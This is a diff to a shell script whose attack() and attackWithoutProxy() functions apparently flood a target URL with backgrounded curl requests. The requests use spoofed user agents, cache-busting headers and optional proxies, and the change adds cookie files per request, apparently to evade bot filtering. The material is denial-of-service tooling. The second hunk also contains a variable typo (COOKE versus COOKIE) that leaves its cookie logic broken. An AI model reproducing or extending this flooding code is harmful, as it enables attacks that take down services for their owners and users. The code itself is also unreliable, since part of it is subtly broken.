@@ -99,7 +99,11 @@ function attack()
     local P=$2
     local H=$3
     local THREADS=$4
-    RESULT=`$CURL -H "User-Agent: $H" -H "Cache-Control: no-cache" -H "Pragma: no-cache" -x $P $URL &`
+    local COOKIE=$RANDOM
+
+    RESULT=`$CURL -H "User-Agent: $H" -H "Cache-Control: no-cache" -H "Pragma: no-cache" -x $P -c "$COOKIE" -b "$COOKIE" $URL &`
+
+    rm $COOKIE 2> /dev/null
 
     #Print result
     echo -e "$URL"
@@ -113,7 +117,11 @@ function attackWithoutProxy()
     local URL=$1
     local H=$2
     local THREADS=$3
-    RESULT=`$CURL -H "user-agent: $H" -H "Cache-Control: no-cache" -H "Pragma: no-cache" $URL &`
+    local COOKE=$RANDOM
+
+    RESULT=`$CURL -H "user-agent: $H" -H "Cache-Control: no-cache" -H "Pragma: no-cache" -c "$COOKIE" -b "$COOKIE" $URL &`
+
+    rm $COOKIE 2> /dev/null
 
     echo -e "$URL"
     echo -e "HTTP Status : $RESULT\tProxy : \033[0;31mNo Proxy\033[0m"
